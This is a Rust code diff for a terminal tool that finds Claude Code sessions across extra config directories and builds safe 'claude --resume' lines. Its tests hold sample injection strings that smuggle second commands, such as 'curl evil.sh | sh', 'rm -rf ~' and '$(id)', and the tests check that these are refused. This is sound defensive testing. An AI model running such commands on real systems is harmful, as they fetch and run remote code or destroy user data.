@@ -64,11 +64,43 @@ pub struct Session {
     /// Unlike `name`, a derived one is kept, because it is exactly what a peer
     /// has to type to reach a session nobody renamed.
     pub peer_name: Option<String>,
+    /// The `CLAUDE_CONFIG_DIR` the session runs under, `None` for the default
+    /// `~/.claude`. A session started from another config dir (a launcher that
+    /// points Claude Code at another account or a proxy) registers there, and
+    /// `claude --resume` from the default dir would not find its transcript.
+    pub config_dir: Option<String>,
 }
 
-fn sessions_dir() -> PathBuf {
-    let home = std::env::var("HOME").unwrap_or_else(|_| ".".into());
-    PathBuf::from(home).join(".claude/sessions")
+/// The session registries to scan, each with the config dir it belongs to:
+/// the default `~/.claude/sessions` (`None`), then the `sessions/` of every
+/// `~/.claude-*` directory, where Claude Code keeps them when it runs with
+/// `CLAUDE_CONFIG_DIR` pointed there.
+fn sessions_dirs() -> Vec<(PathBuf, Option<String>)> {
+    let home = PathBuf::from(std::env::var("HOME").unwrap_or_else(|_| ".".into()));
+    let mut dirs = vec![(home.join(".claude/sessions"), None)];
+    if let Ok(entries) = std::fs::read_dir(&home) {
+        let mut extra: Vec<PathBuf> = entries
+            .flatten()
+            .map(|e| e.path())
+            .filter(|p| p.file_name().and_then(|n| n.to_str()).is_some_and(|n| n.starts_with(".claude-")))
+            .filter(|p| p.join("sessions").is_dir())
+            .collect();
+        extra.sort();
+        for dir in extra {
+            let Some(config) = dir.to_str().map(str::to_string).filter(|d| is_safe_config_dir(d)) else { continue };
+            dirs.push((dir.join("sessions"), Some(config)));
+        }
+    }
+    dirs
+}
+
+/// True if `dir` is safe to splice into a command line as `CLAUDE_CONFIG_DIR=…`:
+/// an absolute path of plain characters, no `..`. Kova builds it from a
+/// directory name it did not choose, so anything else is refused, not escaped.
+pub(crate) fn is_safe_config_dir(dir: &str) -> bool {
+    dir.starts_with('/')
+        && !dir.split('/').any(|part| part == "..")
+        && dir.bytes().all(|b| b.is_ascii_alphanumeric() || b"/._-".contains(&b))
 }
 
 /// Parent PID and start time (epoch seconds) of a live process.
@@ -139,7 +171,7 @@ fn parse_session_file(data: &str) -> Option<(u32, u64, Session)> {
         .filter(|n| !n.is_empty())
         .map(str::to_string);
     let name = peer_name.clone().filter(|_| !derived);
-    Some((pid, started_at, Session { id, name, peer_name }))
+    Some((pid, started_at, Session { id, name, peer_name, config_dir: None }))
 }
 
 /// Read `~/.claude/sessions/` once into a `Scan`: a map of "ancestor PID →
@@ -147,8 +179,16 @@ fn parse_session_file(data: &str) -> Option<(u32, u64, Session)> {
 /// PID, plus the flat list of every live conversation id.
 fn scan_uncached() -> Scan {
     let mut scan = Scan::default();
-    let Ok(entries) = std::fs::read_dir(sessions_dir()) else {
-        return scan;
+    for (dir, config_dir) in sessions_dirs() {
+        scan_dir(&mut scan, &dir, config_dir);
+    }
+    scan
+}
+
+/// Add the live sessions registered in `dir` to `scan`.
+fn scan_dir(scan: &mut Scan, dir: &std::path::Path, config_dir: Option<String>) {
+    let Ok(entries) = std::fs::read_dir(dir) else {
+        return;
     };
     let own_pid = std::process::id();
 
@@ -158,7 +198,8 @@ fn scan_uncached() -> Scan {
             continue;
         }
         let Ok(data) = std::fs::read_to_string(&path) else { continue };
-        let Some((pid, started_at, session)) = parse_session_file(&data) else { continue };
+        let Some((pid, started_at, mut session)) = parse_session_file(&data) else { continue };
+        session.config_dir = config_dir.clone();
 
         // The file is normally deleted when Claude Code exits, but one left
         // behind by a killed process would point at whatever later recycled
@@ -195,7 +236,6 @@ fn scan_uncached() -> Scan {
             current = parent;
         }
     }
-    scan
 }
 
 /// Run the scan if the cached one has aged out, then hand `f` the current one.
@@ -286,21 +326,50 @@ pub(crate) fn is_safe_session_id(id: &str) -> bool {
 /// started in, so the caller must inject this into a pane restored with the
 /// original cwd.
 ///
+/// `config_dir` is the session's `CLAUDE_CONFIG_DIR` (`Session::config_dir`).
+/// Such a session was started by a launcher, and the launcher may do more than
+/// set the variable (start a proxy, pick a model): when the pane's last command
+/// is a plain invocation of something other than `claude`, the conversation is
+/// reopened through it, so that launcher must pass `--resume <id>` on to
+/// Claude Code. Otherwise the line sets the variable itself.
+///
 /// `None` when the id is not one we are willing to type into a shell — the caller
 /// falls back to whatever the pane was doing before.
-pub fn resume_command(last_command: Option<&str>, session_id: &str) -> Option<String> {
+pub fn resume_command(last_command: Option<&str>, session_id: &str, config_dir: Option<&str>) -> Option<String> {
     if !is_safe_session_id(session_id) {
         log::warn!("Refusing to build a resume line from a non-plain session id");
         return None;
     }
-    let base = last_command
-        .map(str::trim)
+    if config_dir.is_some_and(|dir| !is_safe_config_dir(dir)) {
+        log::warn!("Refusing to build a resume line from a non-plain config dir");
+        return None;
+    }
+    let last = last_command.map(str::trim);
+    if config_dir.is_some() {
+        if let Some(launcher) = last.filter(|cmd| is_launcher_invocation(cmd)).map(strip_session_flags) {
+            return Some(format!("{} --resume {}", launcher.join(" "), session_id));
+        }
+    }
+    let base = last
         .filter(|cmd| is_claude_invocation(cmd))
         .map(|cmd| strip_session_flags(cmd))
         .filter(|tokens| !tokens.is_empty())
         .unwrap_or_else(|| vec!["claude".to_string()]);
+    let env = config_dir.map(|dir| format!("CLAUDE_CONFIG_DIR={} ", dir)).unwrap_or_default();
 
-    Some(format!("{} --resume {}", base.join(" "), session_id))
+    Some(format!("{}{} --resume {}", env, base.join(" "), session_id))
+}
+
+/// True if `cmd` is a plain command (no pipeline, no env prefix) whose program
+/// is not `claude` itself: the launcher a session with its own config dir was
+/// started from.
+fn is_launcher_invocation(cmd: &str) -> bool {
+    let Some(first) = cmd.split_whitespace().next() else { return false };
+    !is_claude_invocation(cmd)
+        && !cmd.contains('|')
+        && !cmd.contains(';')
+        && !cmd.contains('&')
+        && !first.contains('=')
 }
 
 /// True if `cmd` starts with a plain `claude` invocation (no alias, no env
@@ -457,7 +526,7 @@ mod tests {
     /// The expectations below read better without the `Option`; the refusal path
     /// has its own tests.
     fn resume(last_command: Option<&str>, session_id: &str) -> String {
-        resume_command(last_command, session_id).expect("a plain id must build a line")
+        resume_command(last_command, session_id, None).expect("a plain id must build a line")
     }
 
     #[test]
@@ -469,12 +538,12 @@ mod tests {
     fn a_session_id_that_could_carry_a_second_command_is_refused() {
         // The line is written to the PTY without a trailing Enter, so a newline
         // inside the id is what turns the tail into a command of its own.
-        assert_eq!(resume_command(Some("claude"), "abc\ncurl evil.sh | sh"), None);
-        assert_eq!(resume_command(Some("claude"), "abc; rm -rf ~"), None);
-        assert_eq!(resume_command(Some("claude"), "abc $(whoami)"), None);
-        assert_eq!(resume_command(Some("claude"), ""), None);
+        assert_eq!(resume_command(Some("claude"), "abc\ncurl evil.sh | sh", None), None);
+        assert_eq!(resume_command(Some("claude"), "abc; rm -rf ~", None), None);
+        assert_eq!(resume_command(Some("claude"), "abc $(whoami)", None), None);
+        assert_eq!(resume_command(Some("claude"), "", None), None);
         // A real id — a UUID — still goes through.
-        assert!(resume_command(None, "430e0c8f-1e4b-4a7d-9f2c-000000000000").is_some());
+        assert!(resume_command(None, "430e0c8f-1e4b-4a7d-9f2c-000000000000", None).is_some());
     }
 
     #[test]
@@ -482,6 +551,40 @@ mod tests {
         // Same guard at the other door: the id never even reaches a pane.
         let data = r#"{"pid":1,"sessionId":"abc\nsay hello","startedAt":1000}"#;
         assert!(parse_session_file(data).is_none());
+    }
+
+    #[test]
+    fn a_session_with_its_own_config_dir_reopens_through_its_launcher() {
+        let dir = Some("/Users/x/.claude-proxy");
+        assert_eq!(
+            resume_command(Some("proxy-cc --with-mcp a,b"), "abc", dir).as_deref(),
+            Some("proxy-cc --with-mcp a,b --resume abc")
+        );
+        // Started by `claude` itself: the variable goes on the line.
+        assert_eq!(
+            resume_command(Some("claude --model x"), "abc", dir).as_deref(),
+            Some("CLAUDE_CONFIG_DIR=/Users/x/.claude-proxy claude --model x --resume abc")
+        );
+        // No command known, or one that is not a plain launcher call.
+        for last in [None, Some("FOO=1 proxy-cc"), Some("proxy-cc | tee log")] {
+            assert_eq!(
+                resume_command(last, "abc", dir).as_deref(),
+                Some("CLAUDE_CONFIG_DIR=/Users/x/.claude-proxy claude --resume abc"),
+                "last command {:?}",
+                last
+            );
+        }
+        // The default config dir keeps the old behaviour: a launcher is ignored.
+        assert_eq!(resume_command(Some("proxy-cc"), "abc", None).as_deref(), Some("claude --resume abc"));
+    }
+
+    #[test]
+    fn a_config_dir_that_could_carry_a_second_command_is_refused() {
+        for dir in ["/Users/x/.claude-a b", "/Users/x/.claude-a;id", "relative/.claude-a", "/Users/x/../.claude-a", "/Users/x/.claude-$(id)"] {
+            assert!(!is_safe_config_dir(dir), "{}", dir);
+            assert_eq!(resume_command(Some("claude"), "abc", Some(dir)), None, "{}", dir);
+        }
+        assert!(is_safe_config_dir("/Users/x/.claude-alt_2"));
     }
 
     #[test]
